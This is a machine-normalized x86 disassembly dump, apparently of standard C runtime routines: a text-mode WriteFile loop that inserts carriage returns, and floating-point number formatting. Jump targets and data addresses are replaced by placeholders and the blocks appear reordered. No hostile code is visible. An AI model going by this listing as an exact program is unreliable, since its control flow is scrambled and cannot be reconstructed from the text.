mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_422160
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_4238a9
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_42210e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_42210e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_4238a9
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_41e7c0
push 0x10
push r--data
call sub_4183f0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e08d
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e892
mov eax [ ebp - 0x1c ]
sub_41e89c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_423a83
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_4173d9
test eax eax
movsx eax [ esi ]
push eax
call sub_423a83
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41e90f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_41e991
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41e9ad
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_423b57
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_423aaf
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_41ea09
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_412e40
inc eax
push eax
push esi
add esi edi
push esi
call sub_422220
add esp 0x10
sub_41ea4e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_415547
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_4119bb
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_4119bb
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_41ea09
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
push r--data
push ebx
push esi
call sub_41cf11
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_422220
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_41ebbd
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_423d7b
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_41ea4e
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_423bff
add esp 0x10
cmp eax ebx
je r-xdata
sub_41ec8d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ebbd
add esp 0x18
pop ebp
retn
sub_41ecad
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_415547
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_4119bb
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_4119bb
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_41897d
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41ec8d
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_416ec0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_416900
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_416900
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_412f80
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_416900
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_423e10
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_423e10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_423e10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41f020
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_415547
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41897d
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_41ea09
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_41ea09
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_41ea09
push edi
push 0x30
push esi
call sub_412f80
add esp 0xc
sub_41f117
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_423d7b
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41f020
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_423bff
add esp 0x10
cmp eax ebx
je r-xdata
sub_41f1d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_423d7b
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_41897d
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_423bff
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41ea4e
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41f020
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_41f2cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ebbd
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f117
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ecad
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f1d2
jmp r-xdata
sub_41f354
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f2cc
add esp 0x1c
pop ebp
retn
sub_41f377
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_417d76
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_41f398
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
